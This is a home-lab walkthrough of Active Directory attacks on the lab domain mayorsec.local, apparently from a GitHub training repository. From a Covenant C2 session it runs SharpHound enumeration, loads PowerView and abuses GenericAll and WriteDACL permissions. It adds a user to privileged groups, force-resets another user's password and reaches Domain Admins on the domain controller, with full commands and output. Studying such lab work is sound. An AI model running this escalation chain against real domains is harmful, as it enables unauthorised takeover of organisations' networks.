# 4. Movement, Pivoting, and Persistence in Domain

> ### Machines Required: WorkStation-01,02 and Domain Controller

## 1. Domain Through BloodHound

- Interact with the session of user s.chisholm, Change the directory to `C:\Users\Public`and upload `sharphound.exe` on the target machine.

![image](https://github.com/thesinghsec/Active-Directory--Home-Lab-/assets/126919241/2ed13000-782a-4e4e-8208-38af83fa52ff)

- Execute the sharphound by using cmd `shell sharphound.exe -c all`.

```powershell
(singhx) > shell sharphound1.exe -c all

76 name to SID mappings.
 1 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2023-07-27T14:14:54.0910809+01:00|INFORMATION|SharpHound Enumeration Completed at 2:14 PM on 7/27/2023! Happy Graphing!
```
- Download the `zip` file using Covenant's download command.

```powershell
(singhx) > download 20230727141452_BloodHound.zip

Download completed: 20230727141452_BloodHound.zip
```
- Start `neo4j console` and log in.
- Open BloodHound and upload the zip file we downloaded.
- On navigating to the Analysis tab and finding the shortest path to domain admins we get a graph showing the path to domain admins.

![image](https://github.com/thesinghsec/Active-Directory--Home-Lab-/assets/126919241/092a6d8e-06bf-4b55-a8d1-2c3e9d8bc812)

## 2. Abusing ACLs

- Download [PowerView_dev.ps1](https://github.com/lucky-luk3/ActiveDirectory/blob/master/PowerView-Dev.ps1) and upload to the target machine using Covenant's Upload method.

![image](https://github.com/thesinghsec/Active-Directory--Home-Lab-/assets/126919241/42592b10-2287-4788-bb00-92640b397eac)

- Here we have an escalation path from user s.chisholm to domain admins.

![image](https://github.com/thesinghsec/Active-Directory--Home-Lab-/assets/126919241/53c1f8b1-8045-46e2-aca1-9a28f825850b)

- Move to the PowerShell console, change the directory to `C:\Useers\Public` and invoke `powerview_dev.ps1` in the console.
- use cmd `net user s.chisholm /domain` to get details about the user. The user is a member of Sales, Domain users.

```powershell
PS C:\Users\s.chisholm.mayorsec> cd c:\users\public
PS C:\users\public> . .\powerview_dev.ps1
PS C:\users\public> net user s.chisholm /domain
The request will be processed at a domain controller for domain mayorsec.local.
User name                    s.chisholm

---------------------------------SNIP-----------------------------------------

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Sales
The command completed successfully.
```

- As we have `GenericAll` permission for the user we can add the user to the group.
- Let's add "s.chisholm" to the group "Engineering".

```powershell
PS C:\users\public> net group engineering s.chisholm /add /domain
The request will be processed at a domain controller for domain mayorsec.local.

The command completed successfully.
```
- Actively observing at Bloodhoundd graph we also have `GenericAll` permissions to the "IT ADMINS" group.

```powershell
PS C:\users\public> net group "IT ADMINS" s.chisholm /add /domain
The request will be processed at a domain controller for domain mayorsec.local.

The command completed successfully.
```
- Now, we will reset the password for the user `j.taylor` by using the `-Force` method.

```powershell
PS C:\users\public> $SecPassword = ConvertTo-SecureString "FallOutBoy1!" -AsPlainText -Force
PS C:\users\public> $SecPassword = ConvertTo-SecureString 'FallOutBoy1!' -AsPlainText -Force
PS C:\users\public> $cred = New-Object System.Management.Automation.PSCredential('mayorsec\s.chisholm', $SecPassword)
PS C:\users\public> $UserPass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
PS C:\users\public> Set-DomainUserPassword -Identity j.taylor -AccountPassword $UserPass -Credential $cred
```
- On looking for information on user "j.taylor" we get to know that it's in the administrators group.

```powershell
PS C:\users\public>  net user j.taylor /domain
The request will be processed at a domain controller for domain mayorsec.local.

User name                    j.taylor

------------------SNIP-----------------------

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *Domain Users         *IT Admins
The command completed successfully.
```

- Now, we can log in to `PS Session` using "j.taylor's" credentials.

```powershell
PS C:\users\public> Enter-PSSession -ComputerName dc01 -Credential mayorsec\j.taylor
[dc01]: PS C:\Users\j.taylor\Documents> whoami;hostname
mayorsec\j.taylor
DC01
```

- On observing at Bloodhound graph. User "j.taylor" has `WriteDACL` permissions to the "Administrators" group.

```powershell
[dc01]: PS C:\Users\j.taylor\Documents> net group "Domain Admins" j.taylor /add /domain

The command completed successfully.
```

- To verify our action we can use cmd `net user j.taylor` to see if the user is now a member of the Domain Admins group.

```powershell
[dc01]: PS C:\Users\j.taylor\Documents> net user j.taylor
User name                    j.taylor

------------------------SNIP------------------------

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *Domain Admins        *Domain Users
                             *IT Admins
```

## 3. Pivoting Through Remote Desktop via Compromised Host

